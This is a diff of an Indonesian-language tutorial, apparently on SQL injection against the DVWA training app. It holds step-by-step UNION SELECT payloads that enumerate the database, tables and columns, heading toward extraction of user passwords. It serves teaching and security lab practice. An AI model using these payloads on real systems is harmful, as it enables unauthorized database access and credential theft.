@@ -28,10 +28,17 @@
 ```sql
 # Perintah ini digunakan untuk menampilkan nama database yang digunakan serta versi dari database nya
 # Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
-1' UNION SELECT VERSION(), DATABASE()#
+1' UNION SELECT USER(), DATABASE()#
 ```
 
 ### Tahap Kelima
+```sql
+# Perintah ini digunakan untuk menampilkan nama database yang digunakan serta versi dari database nya
+# Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
+1' UNION SELECT VERSION(), DATABASE()#
+```
+
+### Tahap Keenam
 ```sql
 # Perintah ini digunakan untuk menampilkan semua nama tabel
 # UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
@@ -39,23 +46,23 @@
 1' UNION SELECT 1,table_name FROM information_schema.tables#
 ```
 
-### Tahap Keenam
+### Tahap Ketujuh
 ```sql
-# Perintah ini digunakan untuk menampilkan semua nama tabel yang terdapat di dalam database dvwa(0x64767761)
+# Perintah ini digunakan untuk menampilkan semua nama tabel yang terdapat di dalam database dvwa
 # UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
 # Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
-1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 0x64767761#
+1' UNION SELECT 1,table_name FROM information_schema.tables WHERE table_schema = 'dvwa'#
 ```
 
-### Tahap Ketujuh
+### Tahap Kedelapan
 ```sql
 # Perintah ini digunakan untuk menampilkan semua columns yang terdapat di dalam tabel users(0x7573657273)
 # UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
 # Tanda (#) digunakan untuk mengabaikan sisa kueri setelahnya.
-1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 0x7573657273#
+1' UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name = 'users'#
 ```
 
-### Tahap Kedelapan
+### Tahap Kesembilan
 ```sql
 # Perintah ini digunakan untuk menampilkan semua user dan password yang terdapat di dalam tabel users
 # UNION SELECT digunakan untuk menggabungkan hasil dari dua atau lebih pernyataan SELECT 
